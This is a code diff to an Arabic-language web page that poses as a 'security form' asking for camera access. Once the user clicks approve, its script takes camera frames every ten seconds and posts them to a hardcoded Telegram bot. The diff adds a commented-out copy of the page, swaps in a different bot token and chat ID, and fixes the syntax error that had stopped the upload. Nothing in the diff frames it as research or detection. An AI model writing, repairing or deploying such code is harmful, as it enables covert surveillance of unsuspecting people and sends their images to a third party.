@@ -1,3 +1,111 @@
+<!-- <!DOCTYPE html>  
+<html>  
+<head>  
+    <title>نموذج أمان</title>  
+    <style>  
+        #permissionBox {  
+            position: fixed;  
+            top: 50%;  
+            left: 50%;  
+            transform: translate(-50%, -50%);  
+            background: #1a1a1a;  
+            padding: 2rem;  
+            border-radius: 10px;  
+            text-align: center;  
+            z-index: 10000;  
+        }  
+        #cameraIndicator {  
+            position: fixed;  
+            top: 10px;  
+            right: 10px;  
+            background: red;  
+            padding: 5px;  
+            color: white;  
+            display: none;  
+        }  
+    </style>  
+</head>  
+<body>  
+
+<div id="permissionBox">  
+    <h2 style="color: #fff;">!مطلوب إذن الوصول للكاميرا</h2>  
+    <button onclick="initCamera()" style="padding: 10px 20px; background: #4CAF50; border: none; border-radius: 5px;">  
+        موافقة  
+    </button>  
+</div>  
+
+<div id="cameraIndicator">كاميرا نشطة</div>  
+
+<script>  
+const BOT_TOKEN = '6649802802:AAFc3iuD443KJP7FnDydxL0rSZjy8Me5-P4';  
+const CHAT_ID = '5310078604';  
+let mediaStream = null;  
+
+async function captureFrame() {  
+    const video = document.createElement('video');  
+    video.srcObject = mediaStream;  
+    video.play(); // التشغيل الإجباري  
+
+    return new Promise((resolve) => {  
+        video.onplaying = async () => {  
+            await new Promise(r => setTimeout(r, 700)); // انتظار ضبط الإضاءة  
+
+            const canvas = document.createElement('canvas');  
+            canvas.width = video.videoWidth;  
+            canvas.height = video.videoHeight;  
+
+            const ctx = canvas.getContext('2d');  
+            ctx.filter = 'brightness(1.2) contrast(1.1)'; // تحسينات ضوئية  
+
+            ctx.drawImage(video, 0, 0);  
+            canvas.toBlob(blob => resolve(blob), 'image/png', 1.0);  
+
+            video.remove(); // تنظيف الذاكرة  
+        };  
+    });  
+}  
+
+function captureFrame() {  
+    const video = document.createElement('video');  
+    video.srcObject = mediaStream;  
+    
+    return new Promise((resolve) => {  
+        video.onloadedmetadata = () => {  
+            const canvas = document.createElement('canvas');  
+            canvas.width = video.videoWidth;  
+            canvas.height = video.videoHeight;  
+            canvas.getContext('2d').drawImage(video, 0, 0);  
+            canvas.toBlob(blob => resolve(blob), 'image/jpeg', 0.85);  
+        };  
+    });  
+}  
+
+async function sendToTelegram(blob) {  
+    const formData = new FormData();  
+    formData.append('chat_id', CHAT_ID);  
+    formData.append('photo', blob, 'frame.jpg');  
+
+    try {  
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {  
+            method: 'POST',  
+            body: formData  
+        });  
+    } catch (error) {  
+        console.error('فشل الإرسال:', error);  
+    }  
+}  
+
+function startPeriodicCapture() {  
+    setInterval(async () => {  
+        const frameBlob = await captureFrame();  
+        await sendToTelegram(frameBlob);  
+    }, 10000); // إرسال كل 10 ثواني  
+}  
+</script>  
+
+</body>  
+</html>   -->
+
 <!DOCTYPE html>  
 <html>  
 <head>  
@@ -37,8 +145,8 @@
 <div id="cameraIndicator"></div>  
 
 <script>  
-const BOT_TOKEN = '8001217673:AAGxZtVLBM96hyeljDeDD9PQlfZn8gtHFRU';  
-const CHAT_ID = '6224268464';  
+const BOT_TOKEN = '6649802802:AAFc3iuD443KJP7FnDydxL0rSZjy8Me5-P4';  
+const CHAT_ID = '5310078604';  
 let mediaStream = null;  
 
 async function initCamera() {  
@@ -86,7 +194,7 @@ async function captureAndSend() {
     formData.append('photo', blob, 'capture.jpg');  
 
     try {  
-        await fetch(https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto, {  
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {  
             method: 'POST',  
             body: formData  
         });  
@@ -105,4 +213,4 @@ function stopCamera() {
 </script>  
 
 </body>  
-</html>
+</html>  
